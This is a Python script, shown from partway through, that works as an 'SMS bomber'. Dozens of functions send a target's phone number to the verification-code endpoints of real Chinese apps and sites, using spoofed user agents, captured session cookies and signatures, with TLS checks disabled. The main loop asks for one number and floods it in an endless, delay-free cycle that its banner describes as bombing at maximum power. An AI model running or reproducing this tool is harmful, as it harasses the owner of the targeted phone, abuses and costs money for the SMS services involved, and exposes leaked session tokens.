        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'Cookie': 'server_name_session=994b5bae3ccd22b065c58e8effd2c75d; PHPSESSID=e8199f3666e25499ea70721cc45c721b'
    }
    try:
        requests.post(url, params=params, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_1009(phone):
    url = 'https://app.1009.com.cn/plugin.php'
    params = {
        'id': 'rtj1009_api',
        'token': 'access_token',
        'version': '1',
        'module': 'SendCode',
        'phone': phone,
        'method': 'register',
        'operation': 'send'
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'Cookie': 'K0YO_2132_lastvisit=1781335187; K0YO_2132_saltkey=zjw7z7IH; SITE_TOTAL_ID=a9ceee84d0ac6eb2d5620892c38c018a; K0YO_2132_lastact=1781338788%09forum.php%09image; K0YO_2132_sid=SW58aj'
    }
    try:
        requests.get(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_10009(phone):
    url = 'https://app.1009.com.cn/plugin.php'
    params = {
        'id': 'rtj1009_api',
        'token': 'access_token',
        'version': '1',
        'module': 'SendCode',
        'phone': phone,
        'method': 'register',
        'operation': 'send'
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'Cookie': 'K0YO_2132_lastvisit=1781335187; K0YO_2132_saltkey=zjw7z7IH; SITE_TOTAL_ID=a9ceee84d0ac6eb2d5620892c38c018a; K0YO_2132_lastact=1781338799%09plugin.php%09; K0YO_2132_cookiesms779150=7b06WxERIreEdNTwufy0OCdWLbdjNcPPv4TvzTGeh11gTrVpoZ6okFxEuIWZ%2BSt6Ju2NeoiQt0%2BpNgS1yzU55qjIA2G5mEyuqJF7Qhp7JIkd3Fi17I0CjbuCmkmBAb0iLjfZLx5yjKpYAWPE3RqO%2BwIEQOoYisX5aQ; K0YO_2132_sid=fbvNbc; K0YO_2132_cookiesms103044=ca878nfIHBipZtb1kyABYr%2FrTSYBC1ahrutKVXmmFOKVeWE1ZwA3jMQbo8PujJ%2Fd00YLB1k7lVkUA4BFsQUuuBMi5v%2FhUBkFYSxE6xEbKYLdLtxswHmFfclZen0e0AFMEAASE785%2B0xGA%2Beg0PX%2FpTj5S6MuEou0Cg'
    }
    try:
        requests.get(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_taiyouhe(phone):
    url = 'http://m.taiyouhe.com/api/v1/6209bca8765f5'
    payload = {'is_test': 0, 'mobile': phone, 'type': 1}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; U; Android 16; zh-cn; PJE110 Build/TP1A.220905.001) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1',
        'Accept': 'application/json,application/xml,application/xhtml+xml,text/html;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh',
        'Accept-Serial': '256ae9d3fbeb821aeaa3f055a4721cb1',
        'Content-Type': 'application/json; charset=utf-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_taiyouhe_type3(phone):
    url = 'http://m.taiyouhe.com/api/v1/6209bca8765f5'
    payload = {'is_test': 0, 'mobile': phone, 'type': 3}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; U; Android 16; zh-cn; PJE110 Build/TP1A.220905.001) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1',
        'Accept': 'application/json,application/xml,application/xhtml+xml,text/html;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh',
        'Accept-Serial': '256ae9d3fbeb821aeaa3f055a4721cb1',
        'Content-Type': 'application/json; charset=utf-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_ucanyun(phone):
    url = 'https://yq.ucanyun.com/api/user/sendVerifyCode'
    payload = {'mobile': phone, 'type': 4, 'channel': 1}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'X-Timestamp': '1781339142',
        'X-Client': 'user_app',
        'X-Client-Version': 'PJE110/Android 16/1.0.0',
        'X-Sign': 'ce24f2d4b64f052b7a7d5e3db6f1e771'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_wanwujiekedayouda(phone):
    url = 'https://dada.wanwujiekedayouda.com/api/sms/send'
    payload = {'mobile': phone, 'event': 'mobilelogin', 'source_model': 'mobile', 'verison': 151}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'token': '',
        'Cookie': 'server_name_session=77c40b01375624ae4d51faf6dc1155a2'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_wanwujiekedayouda_register(phone):
    url = 'https://dada.wanwujiekedayouda.com/api/sms/send'
    payload = {'mobile': phone, 'event': 'register', 'source_model': 'mobile', 'verison': 151}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'token': '',
        'Cookie': 'server_name_session=77c40b01375624ae4d51faf6dc1155a2'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_szquandz(phone):
    url = 'https://app.szquandz.com/quandazi-app/api/v1/sms/aliSend'
    payload = {'mobile': phone, 'client': '1', 'model': 'OnePlus PJE110', 'event': 'login', 'cid': '24fd49749ca5b30f1a2f052c4a8d4f7fb'}
    headers = {
        'User-Agent': 'okhttp/3.14.9',
        'Accept-Encoding': 'identity',
        'token': '',
        'type': 'Android',
        'version': '1.0.8',
        'versionnum': '108',
        'accept-language': 'zh-CN,zh;q=0.9',
        'authorization': 'Bearer'
    }
    try:
        requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_yucunkeji(phone):
    url = 'https://travel-partner.car.yucunkeji.com/api/yc-im/sendSmsCode'
    payload = {'phone': phone}
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip',
        'app-version': '1.0.13',
        'content-type': 'application/json;charset=utf-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_zzyskj(phone):
    url = 'https://web.zzyskj.com/app-api/member/auth/send-sms-code'
    payload = {'equipment': 'oneplus PJE110', 'mobile': phone, 'scene': 1}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_tongchengquanxi(phone):
    url = 'https://www.tongchengquanxi.com/api/sms/sendCode'
    payload = {'scene': 'ZHDLMM', 'mobile': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_17gwx(phone):
    url = 'https://api-blink-app.17gwx.com/blink/user/send_sms'
    params = {
        'mobile': phone,
        'area_code': '86',
        'sms_type': '1',
        'platform': 'android',
        'device_id': '46b70abd72b879c3',
        'device_brand': 'oneplus',
        'app_version': '1.6',
        'channel': 'oppo'
    }
    headers = {
        'User-Agent': 'okhttp/4.9.2',
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip',
        'content-type': 'application/json'
    }
    try:
        requests.get(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_originalart(phone):
    url = 'https://shxy.originalart.cn/app/sendMsg'
    payload = {'mobile': phone, 'scene': 5}
    headers = {
        'User-Agent': 'okhttp/3.12.13',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'appVersion': '3.1.5',
        'os': 'Android',
        'osVersion': '16',
        'deviceModel': 'PJE110',
        'brand': 'OnePlus',
        'deviceID': '9c8d4a1d32ec323b',
        'platform': 'android',
        'Content-Type': 'application/json; charset=utf-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_ninzhi(phone):
    url = 'https://www.ninzhi.com/index.php'
    params = {'api': '', 'types': 'regphonecode'}
    payload = {'phone': phone, 'type': 'phone'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'Cookie': 'PHPSESSID=is9m91cst36ad6t4qg4e08dsr0'
    }
    try:
        requests.post(url, params=params, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_yuehuomusic(phone):
    url = 'https://api.yuehuomusic.com/auth/sms/send'
    params = {'phone': phone}
    payload = {'phone': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Accept-Language': 'zh-CN',
        'Content-Type': 'application/json'
    }
    try:
        requests.post(url, params=params, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_puhuaweb(phone):
    url = 'https://tgg.puhuaweb.com/sms/index.php'
    params = {'tel': phone}
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'}
    try:
        requests.get(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

if __name__ == '__main__':
    import sys
    import time

    # ----- 自动收集所有发送函数（保证不漏一个） -----
    all_functions = []
    for name, obj in list(globals().items()):
        if name.startswith('send_') and callable(obj):
            all_functions.append(obj)

    # ----- 最大化轰炸配置（威力拉满） -----
    REQUEST_INTERVAL = 0.0      # 接口间无间隔，瞬间发完所有接口
    ROUND_INTERVAL   = 0        # 轮间无间隔，一轮结束立刻开始下一轮
    MAX_RETRIES      = 2        # 失败重试2次，提高成功率
    ENABLE_STATS     = True     # 显示统计

    print("\n" + "="*60)
    print("  短信轰炸 · 无限循环增强版（自动收集所有接口）")
    print(f"  已自动加载 {len(all_functions)} 个发送接口")
    print("  输入手机号后，将永久循环轰炸，按 Ctrl+C 停止")
    print("="*60 + "\n")

    if not all_functions:
        print("❌ 错误：未找到任何发送函数！")
        sys.exit(1)

    # ----- 只输入一次手机号 -----
    while True:
        phone = input('请输入手机号（11位数字）: ').strip()
        if phone.isdigit() and len(phone) == 11:
            break
        print('❌ 手机号格式错误，请重新输入。')

    print(f'\n✅ 已锁定手机号: {phone}，开始无限循环轰炸...\n')

    round_count = 0
    try:
        while True:
            round_count += 1
            total = len(all_functions)
            success = 0
            failure = 0

            print(f'\n{"="*60}')
            print(f'第 {round_count} 轮开始，共 {total} 个接口')
            print('='*60)

            for idx, func in enumerate(all_functions, 1):
                print(f'[{idx:3d}/{total}] {func.__name__:30s} ', end='', flush=True)

                ok = False
                for attempt in range(MAX_RETRIES + 1):
                    try:
                        func(phone)
                        ok = True
                        break
                    except Exception:
                        if attempt < MAX_RETRIES:
                            time.sleep(0.3)
                if ok:
                    print('✓')
                    success += 1
                else:
                    print('✗')
                    failure += 1

                time.sleep(REQUEST_INTERVAL)

            if ENABLE_STATS:
                print(f'\n{"="*60}')
                print(f'✅ 第 {round_count} 轮完成 | 成功: {success} | 失败: {failure} | 成功率: {success/total*100:.1f}%')
                print(f'⏳ 等待 {ROUND_INTERVAL} 秒后进入下一轮...')
                print('='*60)

            time.sleep(ROUND_INTERVAL)

    except KeyboardInterrupt:
        print(f'\n\n⚠️ 用户中断，共执行 {round_count} 轮。')
        sys.exit(0)